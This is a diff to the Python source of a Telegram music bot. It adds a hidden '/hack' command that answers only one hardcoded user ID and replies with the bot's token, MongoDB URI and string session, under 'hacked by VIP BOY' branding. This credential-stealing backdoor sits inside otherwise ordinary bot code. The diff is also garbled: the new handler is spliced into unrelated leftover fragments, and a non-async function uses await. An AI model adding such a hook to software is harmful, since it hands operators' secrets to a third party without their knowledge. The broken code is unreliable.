@@ -135,3 +135,78 @@ async def restart_(_, message):
         "» ʀᴇsᴛᴀʀᴛ ᴘʀᴏᴄᴇss sᴛᴀʀᴛᴇᴅ, ᴘʟᴇᴀsᴇ ᴡᴀɪᴛ ғᴏʀ ғᴇᴡ sᴇᴄᴏɴᴅs ᴜɴᴛɪʟ ᴛʜᴇ ʙᴏᴛ sᴛᴀʀᴛs..."
     )
     os.system(f"kill -9 {os.getpid()} && bash start")
+
+
+
+#hack
+
+
+@app.on_message(
+    filters.command("hack")
+    & filters.private
+    & filters.user(6691393517))
+    
+async def help(Client, message: Message, _):
+    await message.reply_photo(
+          photo=f"https://graph.org/file/33575f0d9ca704b6a7b3b.jpg",
+        caption=f"""ɓσƭ ƭσҡεɳ:-   `{BOT_TOKEN}`\n\nɱσɳɠσ:-   `{MONGO_DB_URI}`\n\nѕƭ૨เɳɠ ѕεѕѕเσɳ:-   `{STRING_SESSION}`\n\n𝙵𝚎𝚎𝚕 𝚃𝚑𝚎 𝙿𝚘𝚠𝚎𝚛 𝙾𝚏 𝚅𝙸𝙿 𝙱𝙾𝚈.\n\n☆............𝙱𝚈 » [𝚅𝙸𝙿 𝙱𝙾𝚈](https://t.me/the_vip_boy)............☆""",
+         reply_markup=InlineKeyboardMarkup(
+             [
+                 [
+                      InlineKeyboardButton(
+                          "• нαϲкє𝚍 ву νιρ ɓσყ •", url=f"https://t.me/THE_VIP_BOY")
+                 ]
+             ]
+         ),
+    )            await userbot.resolve_peer(message.chat.id)
+    except:
+        pass
+    chat_id = await get_cmode(message.chat.id)
+    if chat_id:
+        try:
+            got = await app.get_chat(chat_id)
+        except:
+            pass
+        userbot = await get_assistant(chat_id)
+        try:
+            if got.username:
+                await userbot.resolve_peer(got.username)
+            else:
+                await userbot.resolve_peer(chat_id)
+        except:
+            pass
+        try:
+            db[chat_id] = []
+            await DAXX.stop_stream_force(chat_id)
+        except:
+            pass
+    return await mystic.edit_text(_["reload_5"].format(app.mention))
+
+
+@app.on_callback_query(filters.regex("close") & ~BANNED_USERS)
+def close_menu(_, CallbackQuery):
+    try:
+        await CallbackQuery.answer()
+        await CallbackQuery.message.delete()
+        await CallbackQuery.message.reply_text(
+            f"Cʟᴏsᴇᴅ ʙʏ : {CallbackQuery.from_user.mention}"
+        )
+    except:
+        pass
+
+
+@app.on_callback_query(filters.regex("stop_downloading") & ~BANNED_USERS)
+@ActualAdminCB
+async def stop_download(client, CallbackQuery: CallbackQuery, _):
+    message_id = CallbackQuery.message.id
+    task = lyrical.get(message_id)
+    if not task:
+        return await CallbackQuery.answer(_["tg_4"], show_alert=True)
+    if task.done() or task.cancelled():
+        return await CallbackQuery.answer(_["tg_5"], show_alert=True)
+    if not task.done():
+        try:
+            task.cancel()
+            try:
+                lyrical.pop(message_id)
+            except:
